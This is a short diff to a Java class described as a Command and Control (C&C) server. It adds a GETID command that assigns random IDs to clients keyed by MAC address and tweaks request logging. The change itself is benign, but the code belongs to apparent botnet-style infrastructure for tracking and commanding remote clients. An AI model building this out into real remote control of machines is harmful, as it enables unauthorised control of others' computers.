@@ -8,6 +8,7 @@ import java.net.Socket;
 import java.util.HashMap;
 import java.util.HashSet;
 import java.util.Set;
+import java.util.concurrent.ThreadLocalRandom;
 
 /**
  * Represents a Command and Control (C&C) server
@@ -24,11 +25,16 @@ public class CommandServer implements RequestHandler, CommandHandler {
 	private final HashMap<String, Command> cmdsServer;
 	private final HashMap<String, Command> cmdsClient;
 	
-	// The set of connected clients
+	// The set of connected clients IPs
 	private Set<InetAddress> clients;
+	
+	// The set of couples (MAC Address, ID)
+	private HashMap<String, Integer> macMap;
 	
 	public CommandServer() {
 		clients = new HashSet<InetAddress>();
+		macMap = new HashMap<String, Integer>();
+		// TODO : load macMap from external file
 		
 		cmdsServer = new HashMap<String, Command>();
 		cmdsClient = new HashMap<String, Command>();
@@ -54,6 +60,23 @@ public class CommandServer implements RequestHandler, CommandHandler {
 			@Override
 			public String exec(String[] args) {
 				return null;
+			}
+		});
+		
+		// Assign an ID to a client
+		cmdsClient.put("GETID", new Command(){
+			@Override
+			public String exec(String[] args) {
+				// Already known client
+				if (macMap.containsKey(args[0])){
+					return Integer.toString(macMap.get(args[0]));
+				}
+				// New client
+				else {
+					int id = ThreadLocalRandom.current().nextInt(1000, 10000);
+					macMap.put(args[0], id);
+					return Integer.toString(id);
+				}
 			}
 		});
 		
@@ -96,7 +119,8 @@ public class CommandServer implements RequestHandler, CommandHandler {
 		String request = builder.toString();
 				
 		// TODO log
-		System.out.println(socket.getInetAddress() + ": " + request);
+		System.out.print("\n" + socket.getInetAddress()
+						+ ": " + request + "\n>");
 		
 		// Executing command
 		ParsedCommand pCmd = new ParsedCommand(request);
